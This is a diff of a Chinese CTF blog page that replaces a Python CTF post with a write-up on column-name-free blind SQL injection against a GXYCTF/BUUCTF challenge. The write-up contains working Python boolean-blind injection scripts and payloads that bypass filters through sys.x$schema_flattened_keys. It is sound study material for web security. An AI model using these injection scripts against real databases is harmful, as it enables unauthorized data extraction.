@@ -6,20 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Python_test | Welcome to Tristan&#39;s Blog!</title>
+  <title>无列名注入(二) | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Python 脚本编写这题之前在Bugku做过类似的，直接上payload脚本，刚开始用range（1000）结果在BUU跑不了，改用while循环解决： import requests import re  s &#x3D; requests.Session()  url &#x3D; &quot;http:&#x2F;&#x2F;db2f7f0b-5889-4b30-b86b-17061a6b7704.node3.buuoj.cn&#x2F;">
+  <meta name="description" content="无列名注入——比较法盲注在之前的一篇文章里，曾经介绍过使用union+select的方式进行无列名注入；今天再介绍另外一种无列名注入的方法——使用select +比较法进行盲注，从而实现无列名注入。这种方法主要借助子查询并与查询结果进行按位比较；根据返回结果，从而盲注出数据内容；下图是我创建的一张表：先简单介绍一下数据库是如何按位比较的：先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python_test">
-<meta property="og:url" content="http://yoursite.com/2020/04/19/Python-test/index.html">
+<meta property="og:title" content="无列名注入(二)">
+<meta property="og:url" content="http://yoursite.com/2020/04/29/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="Python 脚本编写这题之前在Bugku做过类似的，直接上payload脚本，刚开始用range（1000）结果在BUU跑不了，改用while循环解决： import requests import re  s &#x3D; requests.Session()  url &#x3D; &quot;http:&#x2F;&#x2F;db2f7f0b-5889-4b30-b86b-17061a6b7704.node3.buuoj.cn&#x2F;">
+<meta property="og:description" content="无列名注入——比较法盲注在之前的一篇文章里，曾经介绍过使用union+select的方式进行无列名注入；今天再介绍另外一种无列名注入的方法——使用select +比较法进行盲注，从而实现无列名注入。这种方法主要借助子查询并与查询结果进行按位比较；根据返回结果，从而盲注出数据内容；下图是我创建的一张表：先简单介绍一下数据库是如何按位比较的：先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-04-19T14:31:24.000Z">
-<meta property="article:modified_time" content="2020-04-19T14:35:15.525Z">
+<meta property="og:image" content="http://yoursite.com/2020/04/29/images/57.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/29/images/58.jpg">
+<meta property="article:published_time" content="2020-04-29T07:06:47.000Z">
+<meta property="article:modified_time" content="2020-04-29T07:50:10.055Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="python">
+<meta property="article:tag" content="sql-injection">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/29/images/57.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -137,47 +140,68 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Python-test" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-无列名注入-二" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Python_test
+      无列名注入(二)
     </h1>
   
 
         
-        <a href="/2020/04/19/Python-test/" class="archive-article-date">
-  	<time datetime="2020-04-19T14:31:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-19</time>
+        <a href="/2020/04/29/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C/" class="archive-article-date">
+  	<time datetime="2020-04-29T07:06:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Python-脚本编写"><a href="#Python-脚本编写" class="headerlink" title="Python 脚本编写"></a>Python 脚本编写</h3><p>这题之前在Bugku做过类似的，直接上payload脚本，刚开始用range（1000）结果在BUU跑不了，改用while循环解决：</p>
-<pre><code>import requests
-import re
+        <h4 id="无列名注入——比较法盲注"><a href="#无列名注入——比较法盲注" class="headerlink" title="无列名注入——比较法盲注"></a>无列名注入——比较法盲注</h4><p>在之前的一篇文章里，曾经介绍过使用union+select的方式进行无列名注入；今天再介绍另外一种无列名注入的方法——使用select +比较法进行盲注，从而实现无列名注入。<br>这种方法主要借助子查询并与查询结果进行按位比较；根据返回结果，从而盲注出数据内容；下图是我创建的一张表：<br><img src="../images/57.jpg" alt="1"><br>先简单介绍一下数据库是如何按位比较的：<br>先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的strcmp()函数原理一样，举几个例子：</p>
+<pre><code>glag &gt; flag{bbbbb}
+alag{zzzzzzzzzzz} &lt; flag{bbbbb}
+a &lt; flag{bbbbb}
+z &gt; flag{bbbbb}</code></pre><p>那么在保证第一列相等的前提下，即可使用按位比较，推测出第二列的内容：<br>当输入为’f’时，返回的是0；当输入为’g’的时候为1，可以知道内容首位为’f’；因此可以推测出剩余内容；<br><img src="../images/58.jpg" alt="2"><br>或许有人问如何保证第一列相等，方法是与上面一样的，依次猜测；<br>下面以GXYCTF中的一道题目来实践一下这种方法：</p>
+<h5 id="猜测注入类型"><a href="#猜测注入类型" class="headerlink" title="猜测注入类型"></a>猜测注入类型</h5><p>先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。</p>
+<h5 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h5><p>因为过滤了or,in所以不能使用information_schema和Innodb引擎查找；在之前那篇文章也介绍了几种bypass的方法，这里可以使用sys.x$schema_flattened_keys进行绕过</p>
+<h5 id="盲注脚本——爆表名"><a href="#盲注脚本——爆表名" class="headerlink" title="盲注脚本——爆表名"></a>盲注脚本——爆表名</h5><pre><code>import requests
 
-s = requests.Session()
+url=&apos;http://5f94f5d3-28eb-4b23-bfc3-b11cfbfe45d4.node3.buuoj.cn/index.php&apos;
+result=&apos;&apos;
 
-url = &quot;http://db2f7f0b-5889-4b30-b86b-17061a6b7704.node3.buuoj.cn/index.php&quot;
-r = s.post(url)
-count = 0
-while count != 1001:
-expr = re.search(r&quot;(\d+)( \+ | - )(\d+)&quot;, r.text).group()
-answer = eval(expr)
-data = {&quot;answer&quot;: answer}
-     while True:
-        r = s.post(url, data=data)
-        if r.status_code == 200:
+m=requests.session()
+for i in range(1,50):
+    for s in range(32,127):
+        payload=&apos;1 &amp;&amp; ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&apos;+str(i)+&apos;,1))=&apos;+str(s)+&apos;&apos;        
+        print(payload)
+        data1={
+            &quot;id&quot;:payload
+        }
+        part=m.post(url,data=data1)
+        if &quot;Nu1L&quot; in part.text:
+            result=result+chr(s)
+            print(result)
             break
-    count = count + 1
-     print(count)
-print(r.text)
-跑出flag,flag{eefec3b7-dcc1-4032-ada8-b7726b6c8a11}</code></pre>
+    表名：f1ag_1_h33_hhhhh；uer233333333333</code></pre><h5 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h5><p>首先确定共有几列：<br>当输入为：1&amp;&amp;((1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)<br>当输入为：1&amp;&amp;((1，1)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 返回Nu1L<br>说明共有两列<br>接下来确定flag在哪一列中，因为看到参数为id，猜测第一列为id；<br>当输入为1&amp;&amp;((0，’a’)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 查找失败<br>当输入为1&amp;&amp;((1，’a’)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 查找失败<br>当输入为1&amp;&amp;((2,’a’)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 返回Nu1L<br>说明第一列值为1，确定了第一列后，接下来盲注第二列内容：<br>exp脚本为：</p>
+<pre><code>import requests
+url = &apos;http://5f94f5d3-28eb-4b23-bfc3-b11cfbfe45d4.node3.buuoj.cn/index.php&apos;
+x=&apos;&apos;
+for j in range(1,50):
+    for i in range(33,127):
+        flag=x+chr(i)
+        payload = &quot;1&amp;&amp;((1,&apos;{}&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag)
+        data={
+        &apos;id&apos;:payload
+        }
+        r = requests.post(url,data=data)
+        if &apos;Nu1L&apos; in r.text:
+            x=x+chr(i-1)
+            print(x)
+            break</code></pre><p>即可拿到flag</p>
+
       
 
       
@@ -190,7 +214,7 @@ print(r.text)
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql-injection</a>
         		</li>
       		
 		</ul>
@@ -246,7 +270,7 @@ print(r.text)
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/19/Python-test/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/29/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -260,18 +284,9 @@ print(r.text)
   
 <nav id="article-nav">
   
-    <a href="/2020/04/20/MRCTF/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          MRCTF
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/04/19/File-Upload-Phar/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">File_Upload_Phar</div>
+    <a href="/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Sql注入之无列名注入</div>
       <i class="icon-circle-right"></i>
     </a>
   
